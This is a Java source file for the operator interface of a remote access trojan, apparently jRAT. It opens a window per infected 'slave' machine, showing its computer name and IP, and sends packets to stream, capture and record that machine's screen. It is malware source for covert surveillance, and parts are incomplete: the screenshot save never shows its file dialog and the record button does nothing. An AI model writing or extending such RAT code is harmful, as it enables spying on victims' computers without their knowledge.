package pro.jrat.client.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JProgressBar;
import javax.swing.JToolBar;

import pro.jrat.client.ErrorDialog;
import pro.jrat.client.Slave;
import pro.jrat.client.packets.outgoing.Packet12RemoteScreen;
import pro.jrat.client.packets.outgoing.Packet26StopRemoteScreen;
import pro.jrat.client.threads.ThreadFPS;
import pro.jrat.client.ui.components.JRemoteScreenPane;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

@SuppressWarnings("serial")
public class FrameRemoteScreen extends BaseFrame {
	
	public static final Map<Slave, FrameRemoteScreen> instances = new HashMap<Slave, FrameRemoteScreen>();

	private int monitor;
	private int quality;
	private int interval;
	private int size;
	private ThreadFPS threadFps = new ThreadFPS() {
		public void onUpdate(int fps) {
			lblFps.setText("    FPS: " + fps + "    ");
		}
	};
	
	private JToolBar toolBarTop;
	private JToolBar toolBarBottom;
	private JRemoteScreenPane screenPane;
	private JProgressBar progressBar;
	private JCheckBox cbShowProgressBar;
	private JButton btnStart;
	private JButton btnStop;
	private Slave slave;
	private JLabel lblFps;
	private JButton btnCapture;
	private JButton btnRecord;

	public FrameRemoteScreen(Slave sl) {
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		slave = sl;
		threadFps.start();
		
		setTitle("Remote Screen - " + sl.getComputerName() + " - " + sl.getIP());
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteScreen.class.getResource("/icons/screen.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 673, 446);
		
		instances.put(sl, this);
		
		toolBarTop = new JToolBar();
		toolBarTop.setFloatable(false);
		
		toolBarBottom = new JToolBar();
		toolBarBottom.setFloatable(false);
		
		screenPane = new JRemoteScreenPane();
		
		getContentPane().add(toolBarTop, BorderLayout.NORTH);
		getContentPane().add(toolBarBottom, BorderLayout.SOUTH);
		
		cbShowProgressBar = new JCheckBox("");
		cbShowProgressBar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				progressBar.setVisible(cbShowProgressBar.isSelected());
			}
		});
		cbShowProgressBar.setSelected(true);
		cbShowProgressBar.setToolTipText("Show progressbar");
		toolBarBottom.add(cbShowProgressBar);
		
		progressBar = new JProgressBar();
		toolBarBottom.add(progressBar);
		
		lblFps = new JLabel("    FPS: 0    ");
		toolBarBottom.add(lblFps);
		
		btnStart = new JButton("");
		btnStart.setToolTipText("Start");
		btnStart.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/start.png")));
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				start();
			}
		});
		toolBarTop.add(btnStart);
		
		btnStop = new JButton("");
		btnStop.setToolTipText("Stop");
		btnStop.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/stop_close.png")));
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				stop();
			}
		});
		btnStop.setEnabled(false);
		toolBarTop.add(btnStop);
		
		toolBarTop.addSeparator();
		
		btnCapture = new JButton("");
		btnCapture.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				capture();
			}
		});
		btnCapture.setToolTipText("Capture");
		btnCapture.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/camera_black.png")));
		toolBarTop.add(btnCapture);
		
		btnRecord = new JButton("");
		btnRecord.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/record.png")));
		btnRecord.setToolTipText("Record");
		toolBarTop.add(btnRecord);
		toolBarTop.addSeparator();
		
		
		getContentPane().add(screenPane);
	}
	
	public void start() {
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);
	
		slave.addToSendQueue(new Packet12RemoteScreen(size, quality, monitor));
	}
	
	public void stop() {
		btnStart.setEnabled(true);
		btnStop.setEnabled(false);
		
		slave.addToSendQueue(new Packet26StopRemoteScreen());
	}
	
	public void exit() {
		instances.remove(slave);
		threadFps.stopRunning();
		
		slave.addToSendQueue(new Packet26StopRemoteScreen());
	}
	
	public void capture() {
		BufferedImage image = screenPane.getPanel().getImage();
		
		JFileChooser c = new JFileChooser();
		File f = c.getSelectedFile();
		
		if (f != null) {
			try {
				ImageIO.write(image, "png", f);
			} catch (Exception e) {
				ErrorDialog.create(e);
				e.printStackTrace();
			}
		}
	}
	
	public void update(BufferedImage image) {
		screenPane.update(image);
		threadFps.increase();
	}

	public static void show(Slave sl) {
		FrameRemoteScreen frame = new FrameRemoteScreen(sl);
		frame.setVisible(true);
		FrameMonitors dialog = new FrameMonitors(frame, sl);
		dialog.setVisible(true);
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
	}

	public int getInterval() {
		return interval;
	}

	public void setInterval(int interval) {
		this.interval = interval;
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
	}
	
	public ThreadFPS getFPSThread() {
		return threadFps;
	}

	public JProgressBar getProgressBar() {
		return progressBar;
	}

}
